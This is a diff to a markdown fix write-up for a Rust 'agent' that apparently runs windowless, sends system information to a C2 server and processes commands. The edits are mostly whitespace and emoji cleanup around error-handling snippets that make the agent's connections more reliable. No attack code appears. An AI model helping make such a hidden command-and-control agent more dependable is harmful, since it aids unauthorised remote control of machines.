@@ -16,7 +16,7 @@ let mut reader = BufReader::new(stream.try_clone().unwrap());
 - In production mode (`windows_subsystem = "windows"`), panics are completely silent
 - Agent would crash without any indication to user or logs
 
-### 2. **Ignored Write Errors** 
+### 2. **Ignored Write Errors**
 ```rust
 // BEFORE (lines 165-166)
 writer.write_all(sysinfo.as_bytes()).ok();
@@ -60,12 +60,12 @@ fn send_response(writer: &mut TcpStream, response: &str) -> bool {
         debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
         return false;
     }
-    
+
     if let Err(e) = writer.flush() {
         debug_print!("DEBUG: Error flush respuesta: {}", e);
         return false;
     }
-    
+
     true
 }
 ```
@@ -74,17 +74,17 @@ fn send_response(writer: &mut TcpStream, response: &str) -> bool {
 ```rust
 fn send_sysinfo(writer: &mut TcpStream) -> bool {
     // ... collect system info ...
-    
+
     if let Err(e) = writer.write_all(sysinfo.as_bytes()) {
         debug_print!("DEBUG: Error escribiendo sysinfo: {}", e);
         return false;
     }
-    
+
     if let Err(e) = writer.flush() {
         debug_print!("DEBUG: Error flush sysinfo: {}", e);
         return false;
     }
-    
+
     debug_print!("DEBUG: Información enviada exitosamente");
     true
 }
@@ -108,19 +108,19 @@ if !send_response(&mut writer, &response) {
 ## Impact
 
 ### Before Fix
-- ❌ Silent crashes in production mode
-- ❌ Network errors completely ignored
-- ❌ Agent appears to work but server receives nothing
-- ❌ No indication of what's wrong
-- ❌ Resources wasted on dead connections
+-  Silent crashes in production mode
+-  Network errors completely ignored
+-  Agent appears to work but server receives nothing
+-  No indication of what's wrong
+-  Resources wasted on dead connections
 
 ### After Fix
-- ✅ Graceful error handling, no crashes
-- ✅ Network errors detected and reported (dev mode)
-- ✅ System info transmission verified before continuing
-- ✅ Debug output shows exactly what fails (dev mode)
-- ✅ Connection failures detected, agent retries
-- ✅ Clean exit from command loop on broken connection
+-  Graceful error handling, no crashes
+-  Network errors detected and reported (dev mode)
+-  System info transmission verified before continuing
+-  Debug output shows exactly what fails (dev mode)
+-  Connection failures detected, agent retries
+-  Clean exit from command loop on broken connection
 
 ## Files Changed
 
@@ -160,10 +160,10 @@ See `TESTING_DOUBLE_CLICK_FIX.md` for detailed procedures.
 
 ## Backward Compatibility
 
-- ✅ Fully backward compatible
-- ✅ No changes to protocol or command format
-- ✅ Works with existing C2 server without modifications
-- ✅ Dev and production build modes unchanged
+-  Fully backward compatible
+-  No changes to protocol or command format
+-  Works with existing C2 server without modifications
+-  Dev and production build modes unchanged
 
 ## Performance Impact
 
@@ -174,7 +174,7 @@ See `TESTING_DOUBLE_CLICK_FIX.md` for detailed procedures.
 ## Future Improvements
 
 1. Add automated tests with mock TCP streams
-2. Add integration tests with test C2 server  
+2. Add integration tests with test C2 server
 3. Consider adding connection health checks
 4. Add optional telemetry for production deployments
 
